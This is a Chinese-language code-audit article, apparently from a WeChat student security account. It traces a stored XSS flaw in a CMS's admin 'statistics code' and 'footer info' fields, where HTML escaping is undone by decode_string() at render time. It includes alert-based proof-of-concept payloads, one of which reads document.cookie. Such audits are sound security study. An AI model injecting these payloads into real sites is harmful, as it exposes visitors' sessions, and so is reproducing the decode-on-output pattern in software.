#  某CMS XSS漏洞代码审计  
原创 青春计协
                    青春计协  青春计协   2026-03-18 13:38  
  
**点击蓝字 关注我们**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/p4hYM0n6exxQC3FdbgZHDXOreCUibAb2133QLeboGgicb07KFew5f1fu1HbdS6yWcznvwk79mFT5HYQYuZN8Fosw/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/p4hYM0n6exxQC3FdbgZHDXOreCUibAb21Q61GTh0g3ALdCq45rCUvmOicGicutGdESF2v3UkclWjV7VCx8lWCz3rQ/640?wx_fmt=png "")  
  
  
  
  
  
  
  
免责申明：  
  
  
  
      本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号(青春计协)不为此承担任何责任。  
  
  
  
  
  
  
前言：  
  
  
  
短暂的学习下~，  
漏洞简单  
```
知识点补充：
XSS漏洞的本质是：用户可控的输入数据，在输出到网页时，被浏览器当作可执行的代码（如JavaScript）解析，导致恶意脚本在用户浏览器中运行。
```  
  
  
  
  
  
  
A、找输入点：  
  
  
  
首先，我们看看后台哪些地方可以输入内容。在后台“内容”->“站点信息”页面，有两个明显的输入框：  
1. 统计代码（对应数据库字段 statistical）  
  
1. 尾部信息（对应数据库字段 copyright）  
  
这两个字段都允许管理员输入任意内容，包括HTML标签。  
  
  
  
  
  
  
B、跟进controller：  
  
  
```
 跟进后台控制器：apps/admin/controller/content/SiteController.php，找到保存站点信息的方法。
 关键代码如下：

// SiteController.php 约71-72行
public function modSite()
{
// ...
    $data = array(
'statistical' => post('statistical'),  // 接收统计代码
'copyright'   => post('copyright')     // 接收尾部信息
// ...
    );
// 调用模型更新数据库
    $this->model->modSite($data);
}
这里使用了 post() 函数获取参数。
```  
  
  
  
  
  
```
跟进 post() 函数（位于 core/function/helper.php）：
// helper.php
function post($name, $type = null, $default = false, $check = false)
{
    $condition = array(
        'd_source' => 'post',
        'd_type'   => $type,
        'd_default' => $default,
        'd_check'  => $check
    );
    return filter($name, $condition);
}
```  
  
  
  
  
  
```
post() 函数调用 filter() 进行数据处理。跟进 filter() 函数（同一文件）：
// helper.php 
function filter($varname, $condition = array())
{
    // 1. 根据d_source获取原始数据
    switch ($condition['d_source']) {
        case'post':
            $data = @$_POST[$varname];
            break;
        // ...
    }
    
    // 2. 如果指定了d_type，进行类型验证
    if (array_key_exists('d_type', $condition)) {
        switch ($condition['d_type']) {
            case'int':
                $data = intval($data);
                break;
            // ... 其他类型
        }
    }
    
    // 3. 安全过滤：替换危险标签和超全局变量
    $data = preg_replace_r('/pboot:if/i', 'pboot@if', $data);
    $data = preg_replace_r('/pboot:sql/i', 'pboot@sql', $data);
    $data = preg_replace_r('/GET\[/i', 'GET@[', $data);
    $data = preg_replace_r('/POST\[/i', 'POST@[', $data);
    
    // 4. 转义HTML实体
    $data = escape_string($data);
    
    return $data;
}
这里关键点是：
d_type 参数为 null，跳过类型验证
只替换了 pboot: 标签和超全局变量，不过滤 <script> 等HTML标签
最后调用 escape_string() 转义HTML实体
```  
  
  
  
  
  
```
跟进 escape_string() 函数（core/function/handle.php）：
// handle.php 
function escape_string($string)
{
if (is_array($string)) {
        foreach ($string as $key => $value) {
            $string[$key] = escape_string($value);
        }
    } else {
        $string = htmlspecialchars(trim($string), ENT_QUOTES, 'UTF-8');
        $string = addslashes($string);
    }
return $string;
}

htmlspecialchars() 将 <、> 等字符转义为HTML实体，例如：
输入 <script>alert(document.cookie)</script>
输出 &lt;script&gt;alert(document.cookie)&lt;/script&gt;

这样，恶意脚本被安全地转义后存入数据库。此时，数据库存储的是转义后的安全字符串，不存在XSS
```  
  
  
  
  
  
  
C、渲染输出：  
  
  
```
但是：
前台页面解析的核心控制器是 apps/home/controller/ParserController.php。
我们在其中找到解析站点标签的方法 parserSiteLabel()：

// ParserController.php 
private function parserSiteLabel($content)
{
// 匹配 {pboot:sitestatistical} 和 {pboot:sitecopyright} 标签
// ...

// 处理统计代码
case'statistical':
if (isset($data->statistical)) {
            $content = str_replace(
                $matches[0][$i],
                decode_string($data->statistical),  // 这里调用了 decode_string()
                $content
            );
        }
break;

// 处理尾部信息
case'copyright':
if (isset($data->copyright)) {
            $content = str_replace(
                $matches[0][$i],
                $this->adjustLabelData($params, decode_string($data->copyright)),  // 同样先 decode_string()
                $content
            );
        }
break;
}

```  
  
  
  
  
  
```
关键点：在替换标签时，调用了 decode_string() 函数。
跟进这个函数（core/function/handle.php）：
// handle.php 
function decode_string($string)
{
    if (is_array($string)) {
        foreach ($string as $key => $value) {
            $string[$key] = decode_string($value);
        }
    } else {
        $string = stripslashes($string);                     // 去除addslashes添加的转义
        $string = htmlspecialchars_decode($string, ENT_QUOTES); // 还原HTML实体
    }
    return $string;
}
这个函数的作用正好是 escape_string() 的逆操作：
htmlspecialchars_decode() 将 &lt; 还原为 <
&gt; 还原为 >
因此，原本存储在数据库中的安全字符串（&lt;script&gt;...&lt;/script&gt;）被还原为原始的 <script>alert(document.cookie)</script>，然后直接输出到HTML页面。
```  
  
  
  
  
  
  
D、完整流程：  
  
  
```
管理员在后台“站点信息”的“统计代码”或“尾部信息”字段中填入：
<script>alert(document.cookie)</script>
数据经过 escape_string() 转义为 &lt;script&gt;alert(document.cookie)&lt;/script&gt; 后存入数据库。
任意访客访问前台任意包含 {pboot:sitestatistical} 或 {pboot:sitecopyright} 标签的页面。
模板解析时调用 decode_string() 将实体还原，输出 <script>alert(document.cookie)</script>。
浏览器执行该脚本，触发XSS。
```  
  
  
  
  
  
  
F、复现：  
  
  
  
A、环境搭建直接使用小皮面板即可不过多叙述  
```
来到：http://xx.xx.xx.xx/admin.php?p=/Site/index
设置：统计代码字段和尾部信息字段
我这里为了区分所以写的是：
统计代码：<script>alert("Hello World")</script>
尾部信息：<img src=x onerror=alert(document.cookie)>
如下图1，图2，图3
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/kMCnmq4h3kMrFAuVm3VyKLb3ZU5ibb6lw9NcuT34icc09bccZEaBJ0wiaibTyE0b9dnKibgg6A8237CcYxicDYaGorvOfsibFeWTvVeyLFxnLw74qw/640?wx_fmt=png "")  
  
图1  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/kMCnmq4h3kOldQznfVfBJtIv2Jz1LeDelmlYklFexupyNOn40vIg1ic68RibDwA5syMxr2BScryceUtApibzO1Hbicxae3SITmJL2DvSsUyP35I/640?wx_fmt=png "")  
  
Hello World（图2）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/kMCnmq4h3kOdkXVR9ZBFx9PShLKQwSx4sicvOUmmsiaic8NnxhncsINy6LfRiae3ohC0yxCtNtsCTDHkDqt4bpgd2Rv0iaYzLibXiaMrABOiaol76PA/640?wx_fmt=png "")  
  
cookie（图3）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/kMCnmq4h3kPN0pXsXePH2KgIgD3ia5qDsVgVYX1FlA2QKTOGpIgPiaMIOIAXoic2DARWuQ5ib08kibwIXUobB3N7prBku4YQWcFb94I0AXQ0FFkc/640?wx_fmt=jpeg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/kMCnmq4h3kPFU8WgJ9xnicHEPyhVlwD1OeOIjUGYJTlLB7dVtzMicicdDkpzJfJIPicN4edeGMCmt4kjddOibbGnH1WygUiaAy7LyqG89XTSVS9zU/640?wx_fmt=jpeg "")  
  
**编辑｜**  
青春计协  
  
**审核｜青春计协**  
  
